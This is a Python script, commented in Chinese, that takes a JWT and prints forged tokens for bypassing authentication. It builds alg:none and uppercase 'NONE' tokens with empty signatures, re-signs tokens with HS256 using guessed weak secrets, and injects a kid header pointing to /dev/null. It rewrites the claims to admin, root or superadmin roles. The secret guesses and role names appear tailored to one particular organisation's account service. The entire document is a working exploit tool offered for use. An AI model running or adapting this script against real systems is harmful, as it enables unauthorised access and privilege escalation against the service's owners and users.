import base64, json, sys, hmac, hashlib

def b64e(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64d(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

TOK = sys.argv[1] if len(sys.argv)>1 else ""
try:
    h,p,sig = TOK.split('.')
    header = json.loads(b64d(h)); payload = json.loads(b64d(p))
except Exception as e:
    print("PARSE_ERR", e); sys.exit(1)

ORIG_HEADER = b64d(h)   # original header bytes
def hdr(alg, extra=None):
    x = dict(header); x['alg']=alg
    if extra: x.update(extra)
    return b64e(json.dumps(x, separators=(',',':')).encode())

def pld(mut):
    x = dict(payload)
    for k,v in (mut or {}).items():
        x[k]=v
    return b64e(json.dumps(x, separators=(',',':')).encode())

# payload 变体
def pay_rules():   # 提权/换身份 payload 组合
    return {
        'same': pld(None),
        'admin_role': pld({'roles':['hiway','manage','admin'],'scope':['hiway','manage','admin']}),
        'sub_admin': pld({'sub':'admin','username':'admin','login_name':'admin'}),
        'sub_root': pld({'sub':'root','username':'root'}),
        'ou0_roles': pld({'ou':'10720','roles':['hiway','manage','admin','superadmin'],'scope':['hiway','manage','admin','superadmin']}),
        'exp_long': {k:pld(dict(None or {})) for k in []},
    }

# 常见弱HS256秘密
WEAK=['secret','secretkey','password','jwt','jwtsecret','changeme','hiway','hiway123','123456','12345678','lianyi','bas','account-service','bas-account-service']
WS = ['secret','secretkey','password','jwt','jwtsecret','changeme','hiway','hiway123','123456','12345678','bas-account']

def hs256(head_b64, pay_b64, secret):
    msg = f"{head_b64}.{pay_b64}".encode()
    return hmac.new(secret.encode(), msg, hashlib.sha256).digest()

R = []
# 1) alg:none 系列（无签名 / 空签名）
for rn, pb in [('same',pay_rules()['same']),('admin_role',pay_rules()['admin_role']),('sub_admin',pay_rules()['sub_admin']),('sub_root',pay_rules()['sub_root'])]:
    R.append(f"none_{rn}|{hdr('none')}.{pb}.")
    R.append(f"none_{rn}_ws|{hdr('none')}.{pb}. ")
# 2) HS256 弱秘密（同 one、试 admin 角色）
for s in WS:
    R.append(f"hs256_{s}|{hdr('HS256')}.{pay_rules()['admin_role']}.{b64e(hs256(hdr('HS256'),pay_rules()['admin_role'],s))}")
# 3) kid 注入（改 kid 指向）/ alg:none 保留kid
R.append(f"none_kid_null|{hdr('none',{'kid':None})}.{pay_rules()['admin_role']}.")
R.append(f"none_kid_exploit|{hdr('none',{'kid':'/dev/null'})}.{pay_rules()['sub_admin']}.")
# 4) alg 大小写混淆 / alg:'NONE'
R.append(f"NONE_up|{hdr('NONE')}.{pay_rules()['admin_role']}.")
R.append(f"none_typjwt|{b64e(json.dumps({'alg':'none','typ':'JWT'},separators=(',',':')).encode())}.{pay_rules()['admin_role']}.")

for line in R:
    print(line)
